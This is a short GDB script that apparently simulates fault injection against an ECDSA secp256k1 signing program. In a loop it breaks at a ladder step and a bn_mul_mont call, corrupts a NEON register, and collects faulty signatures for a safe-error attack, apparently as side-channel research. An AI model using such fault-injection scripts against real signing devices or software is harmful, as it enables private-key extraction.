set pagination off
set logging off
b main
r
# breakpoint at ladder_step
b *0xb6e9808c
# breakpoint somewhere in bn_mul_mont
b *0xb6e0cf48
disable 2
disable 3
kill

set $ctr=0
while($ctr<1400)
  print $ctr
  r privkey_secp256k1.pem message.txt sig_safeerror_ladder.bin
  # do nothing in first 252 ladder steps
  enable 2
  ignore 2 252
  c
  # now we are at step j=3
  # the target is a multiplication bn_mul_mont
  # (arbitrary choice)
  enable 3
  ignore 3 4
  c
  # modify a register with a "random" value
  set $q9.u64={0x55adab,0xc0ffee}
  disable 2
  disable 3
  c
  set $ctr=$ctr+1
end
quit
